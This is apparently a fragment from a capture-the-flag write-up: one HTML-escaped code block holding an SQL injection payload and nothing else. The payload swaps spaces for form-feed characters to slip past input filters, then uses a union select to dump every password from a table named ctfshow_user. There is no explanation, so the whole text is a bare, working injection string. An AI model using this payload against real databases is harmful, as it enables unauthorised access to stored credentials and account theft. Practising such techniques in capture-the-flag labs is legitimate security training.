&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;-1&amp;#39;%0cunion%0cselect%0c1,2,group_concat(password)%0cfrom%0cctfshow_user%0cwhere%0c&amp;#39;1&amp;#39;=&amp;#39;1
